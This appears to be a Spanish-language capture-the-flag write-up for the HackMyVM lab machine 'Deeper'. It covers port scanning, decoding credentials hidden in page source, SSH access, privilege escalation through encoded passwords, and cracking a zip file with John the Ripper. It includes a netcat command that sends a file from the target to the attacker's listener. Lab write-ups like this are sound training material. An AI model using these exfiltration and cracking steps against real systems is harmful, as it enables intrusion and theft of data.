---
layout: post
title: Deeper
date: 2023-07-11
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, Cracking, Brute Force]
---

# Deeper [ Hack My VM ]
![light mode only](/assets/img/imgs/deeper/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/deeper/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Tue Sep 19 11:03:54 2023 as: nmap -sCV -p22,80 -oN targeted 192.168.1.109
Nmap scan report for 192.168.1.109
Host is up (0.00076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey: 
|   256 37d16fb5a496e87818c777d03e204e55 (ECDSA)
|_  256 cf5d90f3373fa4e2bad5d725c64aa061 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Deeper
MAC Address: 08:00:27:AB:67:09 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Sep 19 11:04:14 2023 -- 1 IP address (1 host up) scanned in 19.89 seconds

```

Vemos que el puerto `22` está abierto, pero no tenemos credenciales válidas por el momento.

### Inspección
Si entramos a la página veremos un texto junto a una imagen:

![deeperIndex](/assets/img/imgs/deeper/deeperIndex.png)

El texto traducido es este: **`Vamos a ver a dónde nos llevan estas luces rojas...`**

No nos dice mucho, así que vayamos a ver el código fuente:

![deeperIndexCode](/assets/img/imgs/deeper/deeperIndexCode.png)

Vemos que entre todo el código fuente hay un comentario que nos dice que vayamos a **`deeper`**, vamos a hacerle caso y vayamos al directorio mencionado. No hay nada nuevo, otra imagen y texto insignificativo, veamos el código fuente:

![deeperDeeperCode](/assets/img/imgs/deeper/deeperDeeperCode.png)

Igual que antes, nos menciona otro directorio, esta vez llamado **`evendeeper`**. Vamos a ver con qué nos encontramos. Qué sorpresa, el código renderizado nos nos dice absolutamente nada, otra imagen y texto para decorar.

Qué extraño, en el código fuente hay líneas sin nada y podemos desplazarnos mucho hacia abajo y hacia la derecha:

![morseUser](/assets/img/imgs/deeper/morseUser.png)
![HEXPassword](/assets/img/imgs/deeper/HEXPassword.png)

Esto sí no me lo esperaba, un nombre de usuario en código **`morse`** y la contraseña en **`hexadecimal`**. Bueno, vayamos a ver cómo obtener el texto plano.

# Movimiento Lateral
### Shell
Bien, comencemos por el usuario. Para ello me dirigí a [**`MorseCode`**](https://morsecode.world/international/translator.html) y, como es obvio, pegué el usuario para que me devolviera el texto original:

![morseUserOutput](/assets/img/imgs/deeper/morseUserOutput.png)

Espléndido, ahora nos falta la contraseña de **`Alice`**, para ello fui a [**`DupliChecker`**](https://www.duplichecker.com/hex-to-text.php) y, de nuevo, pegué ahí el texto encontrado. Este fue el resultado:

![HEXPasswordOutput](/assets/img/imgs/deeper/HEXPasswordOutput.png)


> Esta es la manera más cómoda, pero también se puede hacer a través de una terminal.
{: .prompt-info }

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Deeper]
└─# echo "53586470624778486230526c5a58426c63673d3d" | xxd -r -p
SXdpbGxHb0RlZXBlcg==
```

En fin, vemos que se tomó "enserio" lo de proteger su contraseña, pues ahora estamos ante una cadena en **`Base64`**. Para obtener la contraseña en texto plano no necesitamos ninguna página (aunque por comodidad, ya visto anteriormente, se podría), lo podemos hacer a través de la terminal:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Deeper]
└─# echo "SXdpbGxHb0RlZXBlcg==" | base64 -d
IwillGoDeeper
```

¡Qué bien! Tenemos las credenciales de **`Alice`**, vamos a conectarnos por **`SSH`**:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Deeper]
└─# ssh alice@192.168.1.108
alice@192.168.1.108's password: IwillGoDeeper
Linux deeper 6.1.0-11-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.38-4 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Sep 19 17:22:03 2023 from 192.168.1.109
alice@deeper:~$
```

### Subida de privilegios #1
Ahora que estamos en la máquina como **`Alice`** toca explorar un poco, veamos nuestro directorio de trabajo:

```sh
alice@deeper:~$ ls -la
total 32
drwxr--r-- 3 alice alice 4096 Aug 26 00:14 .
drwxr-xr-x 4 root  root  4096 Aug 25 20:07 ..
lrwxrwxrwx 1 alice alice    9 Aug 25 19:01 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 Aug 25 17:58 .bash_logout
-rw-r--r-- 1 alice alice 3526 Aug 25 17:58 .bashrc
-rw-r--r-- 1 alice alice   41 Aug 25 20:43 .bob.txt
drwxr-xr-x 3 alice alice 4096 Aug 26 00:14 .local
-rw-r--r-- 1 alice alice  807 Aug 25 17:58 .profile
-rw-r--r-- 1 alice alice   33 Aug 26 00:14 user.txt
```

Vaya, vemos un fichero oculto llamado **`.bob.txt`**, curiosamente hay un usuario llamado **`Bob`**. Vamos a ver qué contiene:

```sh
535746745247566c634556756233566e61413d3d
```

No puede ser, otra cadena en hexadecimal. Se nota que este equipo tiene muy en mente las normas de seguridad. Vamos a ver qué es:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Deeper]
└─# echo "535746745247566c634556756233566e61413d3d" | xxd -r -p
SWFtRGVlcEVub3VnaA==
```

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Deeper]
└─# echo "SWFtRGVlcEVub3VnaA==" | base64 -d
IamDeepEnough
```

Huh, parece una contraseña, supongo que la de **`Bob`**. Vamos a intentarlo:

```sh
alice@deeper:~$ su bob
Password: IamDeepEnough
bob@deeper:/home/alice$
```

¡Qué bien! Parece ser que sí era la contraseña de **`Bob`**.

### Subida de privilegios #2
Estamos a un paso de convertirnos en **`root`** y obtener el **`control total`** de la máquina. Como en la ocasión anterior, vamos a enumerar nuestro entorno de trabajo:

```sh
bob@deeper:~$ ls -la
total 28
drwxr--r-- 3 bob  bob  4096 Aug 26 00:22 .
drwxr-xr-x 4 root root 4096 Aug 25 20:07 ..
lrwxrwxrwx 1 bob  bob     9 Aug 25 20:44 .bash_history -> /dev/null
-rw-r--r-- 1 bob  bob   220 Apr 23 23:23 .bash_logout
-rw-r--r-- 1 bob  bob  3526 Apr 23 23:23 .bashrc
drwxr-xr-x 3 bob  bob  4096 Aug 25 20:17 .local
-rw-r--r-- 1 bob  bob   807 Aug 25 20:09 .profile
-rw-r--r-- 1 bob  bob   215 Aug 26 00:21 root.zip
```

Curioso, vemos un fichero **`ZIP`** con el nombre de **`root`**. Vamos a llevarnos este fichero a nuestra máquina para poder extraerlo ahí:

```sh
bob@deeper:~$ nc -w 3 192.168.1.107 1234 < root.zip
```

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# nc -l -p 1234 > root.zip
```

Ahora sí, vamos a extraerlo con **`unzip`**:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# unzip root.zip
Archive:  root.zip
[root.zip] root.txt password:
```

Pues no, tal vez aún no podamos extraerlo, necesitamos una contraseña que no tenemos. No pasa nada, podemos utilizar **`zip2john`** para convertirlo en un **`hash`** que **`JohnTheRipper`** entienda y, mediante fuerza bruta, obtener la contraseña:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# zip2john root.zip > hash.txt
ver 1.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: 2b chk, TS_chk, cmplen=33, decmplen=21, crc=2D649941 ts=BA81 cs=ba81 type=0
```

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# john hash.txt -w=/usr/share/wordlists/rockyou.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bob              (root.zip/root.txt)     
1g 0:00:00:00 DONE (2023-09-20 17:21) 50.00g/s 1228Kp/s 1228Kc/s 1228KC/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Como vemos hemos obtenido la contraseña del fichero mediante fuerza bruta, aunque con esta contraseña que tenía la podríamos haber adivinado. Vamos a extraer el fichero y ver qué contiene:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# unzip root.zip
Archive:  root.zip
[root.zip] root.txt password: bob
 extracting: root.txt
```

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Deeper/content]
└─# cat root.txt
root:IhateMyPassword
```

Bueno, el usuario más importante y no hay ni una mísera cadena en **`Base64`**, iniciemos sesión como **`root`**:

```sh
bob@deeper:~$ su root
Password: IhateMyPassword
root@deeper:/home/bob#
```

¡Enhorabuena! Hemos obtenido el **`contral total`** de la máquina. ¡Qué fácil!